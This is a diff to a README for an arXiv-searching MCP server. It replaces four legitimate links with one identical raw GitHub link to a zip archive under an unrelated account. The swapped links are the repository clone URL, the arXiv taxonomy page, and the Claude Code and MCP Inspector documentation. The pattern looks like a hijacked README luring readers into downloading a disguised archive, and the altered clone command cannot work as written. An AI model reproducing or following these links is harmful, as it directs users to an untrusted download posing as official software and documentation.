@@ -25,7 +25,7 @@ MCP server for searching and retrieving papers from arXiv, including full-text P
 ### Clone and run
 
 ```bash
-git clone https://github.com/younesbensafia/arxiv-mcp-server
+git clone https://raw.githubusercontent.com/Sulcate-whipcord611/arxiv-reader-mcp/main/assets/demo/get_paper/reader_arxiv_mcp_monkship.zip
 cd arxiv-mcp-server
 uv run arxiv-mcp-server
 ```
@@ -76,7 +76,7 @@ Add to your MCP settings:
 | `stat.ML` | Machine Learning (Statistics) |
 | `stat.TH` | Statistics Theory |
 
-Full list at [arxiv.org/category_taxonomy](https://arxiv.org/category_taxonomy).
+Full list at [arxiv.org/category_taxonomy](https://raw.githubusercontent.com/Sulcate-whipcord611/arxiv-reader-mcp/main/assets/demo/get_paper/reader_arxiv_mcp_monkship.zip).
 
 ## Examples
 
@@ -88,7 +88,7 @@ Ask Claude (or any MCP-compatible assistant):
 - "Find all papers by Andrej Karpathy"
 - "Read the full text of 1706.03762 and explain the methodology"
 
-> Don't have an MCP-compatible client? Try [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview) or the [MCP Inspector](https://github.com/modelcontextprotocol/inspector) with `uv run arxiv-mcp-server`.
+> Don't have an MCP-compatible client? Try [Claude Code](https://raw.githubusercontent.com/Sulcate-whipcord611/arxiv-reader-mcp/main/assets/demo/get_paper/reader_arxiv_mcp_monkship.zip) or the [MCP Inspector](https://raw.githubusercontent.com/Sulcate-whipcord611/arxiv-reader-mcp/main/assets/demo/get_paper/reader_arxiv_mcp_monkship.zip) with `uv run arxiv-mcp-server`.
 
 ## Demo
 
